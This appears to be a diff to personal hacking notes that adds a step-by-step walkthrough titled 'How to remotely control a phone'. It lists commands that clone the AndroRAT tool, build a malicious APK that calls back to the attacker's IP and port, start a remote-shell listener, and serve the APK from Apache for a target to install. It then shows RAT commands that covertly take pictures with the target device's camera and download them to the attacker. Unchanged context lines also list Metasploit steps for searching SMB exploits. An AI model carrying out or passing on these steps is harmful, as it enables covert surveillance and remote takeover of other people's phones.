@@ -8,3 +8,24 @@
 5. `sudo msfconsole`            //initializes MetaSploit Framework Console
 6. `search smb`                 //searches smb exploits
 7. 
+
+//How to remotely control a phone
+1. `git clone https://github.com/karma9874/AndroRAT.git`
+2. `cd AndroRAT/`   //check directory
+3. `ls`             //to view the directory
+4. `pip install -r requirements.txt`
+5. `cat requirements.txt`
+6. `ifconfig`   //find your IP address
+7. `python3 androRAT.py --build -i 192.168.0.11 -p 6666 -o artemis.apk`    //-i your IP address -p Port -o Filename
+8. `ls -l`      //-l list form -lt list newest
+9. `python3 androRAT.py --shell -i 0.0.0.0 -p 6666`  //activates the listener
+10. `sudo systemctl status apache2.service`
+11. `sudo systemctl start apache2.service` 
+12. `cd AndroRAT/`
+13. `sudo cp artemis.apk /var/www/html/`
+On Android device, install the apk file:
+14. In browser, goto: `192.168.0.11/artemis.apk`
+Back in kali terminal, listener will be activated
+`help` to show commands
+`camList`    //returns cameraID of target device
+`takepic 0`  //takes a picture on target device, downloads it to attacker's PC
